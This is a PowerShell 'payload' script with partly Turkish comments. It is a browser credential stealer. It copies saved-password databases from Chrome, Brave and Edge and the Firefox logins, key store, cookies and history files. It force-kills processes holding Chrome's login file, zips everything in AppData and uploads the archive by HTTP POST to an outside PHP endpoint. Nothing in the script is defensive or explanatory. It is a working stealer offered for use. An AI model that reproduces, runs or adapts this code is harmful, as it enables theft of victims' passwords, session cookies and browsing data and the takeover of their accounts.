#-- Payload configuration --#

# Set destination directory directly to AppData
$destDir = "$env:APPDATA\BrowserData"
if (-Not (Test-Path $destDir)) {
    New-Item -ItemType Directory -Path $destDir
}

# Function to copy browser files
function CopyBrowserFiles($browserName, $browserDir, $filesToCopy) {
    $browserDestDir = Join-Path -Path $destDir -ChildPath $browserName
    if (-Not (Test-Path $browserDestDir)) {
        New-Item -ItemType Directory -Path $browserDestDir
    }

    foreach ($file in $filesToCopy) {
        $source = Join-Path -Path $browserDir -ChildPath $file
        if (Test-Path $source) {
            Copy-Item -Path $source -Destination $browserDestDir -ErrorAction SilentlyContinue
            Write-Host "$browserName - File copied: $file"
        } else {
            Write-Host "$browserName - File not found: $file"
        }
    }
}

# Function to find and kill processes using a specific file
function KillProcessesUsingFile($filePath) {
    # Get the process IDs using the file
    $processes = Get-Process | Where-Object { $_.Modules | Where-Object { $_.FileName -eq $filePath } }

    foreach ($process in $processes) {
        Write-Host "Killing process: $($process.Name) with ID: $($process.Id)"
        Stop-Process -Id $process.Id -Force
    }
}

# Configuration for Google Chrome
$chromeDir = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default"
$chromeFilesToCopy = @("Login Data")
CopyBrowserFiles "Chrome" $chromeDir $chromeFilesToCopy

# Configuration for Brave
$braveDir = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default"
$braveFilesToCopy = @("Login Data")
CopyBrowserFiles "Brave" $braveDir $braveFilesToCopy

# Configuration for Firefox
$firefoxProfileDir = Join-Path -Path $env:APPDATA -ChildPath "Mozilla\Firefox\Profiles"
$firefoxProfile = Get-ChildItem -Path $firefoxProfileDir -Filter "*.default-release" | Select-Object -First 1
if ($firefoxProfile) {
    $firefoxDir = $firefoxProfile.FullName
    $firefoxFilesToCopy = @("logins.json", "key4.db", "cookies.sqlite", "webappsstore.sqlite", "places.sqlite")
    CopyBrowserFiles "Firefox" $firefoxDir $firefoxFilesToCopy
} else {
    Write-Host "Firefox - No profile found."
}

# Configuration for Microsoft Edge
$edgeDir = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default"
$edgeFilesToCopy = @("Login Data")
CopyBrowserFiles "Edge" $edgeDir $edgeFilesToCopy

# Sıkıştırmak istediğiniz klasörün yolu
$folderPath = "$env:APPDATA\BrowserData"

# ZIP dosyasının hedef yolu
$zipDestDir = "$env:APPDATA\ZippedBrowserData"
if (-Not (Test-Path $zipDestDir)) {
    New-Item -ItemType Directory -Path $zipDestDir
}

$zipFilePath = "$zipDestDir\BrowserData.zip"

# Kullanıcı dosyası olan Login Data'nın yolunu tanımlayın
$loginDataPath = Join-Path -Path $chromeDir -ChildPath "Login Data"

# Kullanılan dosyayı kullanan süreçleri durdurun
if (Test-Path $loginDataPath) {
    KillProcessesUsingFile $loginDataPath
}

# Klasörü ZIP dosyasına sıkıştırma
try {
    Compress-Archive -Path "$folderPath\*" -DestinationPath $zipFilePath -ErrorAction Stop
} catch {
    Write-Host "ZIP dosyası oluşturulurken bir hata oluştu: $_"
}

# Yüklemek istediğiniz dosyanın yolu
if (Test-Path $zipFilePath) {
    $filePath = $zipFilePath

    # PHP dosya yükleme URL'si
    $url = "https://alperen.cc/uploadd.php" # PHP uygulamanızın URL'sini buraya yazın

    # Dosya yüklemek için form data oluşturma
    $form = @{
        fileToUpload = Get-Item $filePath
    }

    # POST isteği gönderme
    $response = Invoke-RestMethod -Uri $url -Method Post -Form $form -ErrorAction Stop

    # Yanıtı yazdırma
    Write-Output $response
} else {
    Write-Host "ZIP dosyası oluşturulamadığı için yükleme yapılmadı."
}

exit
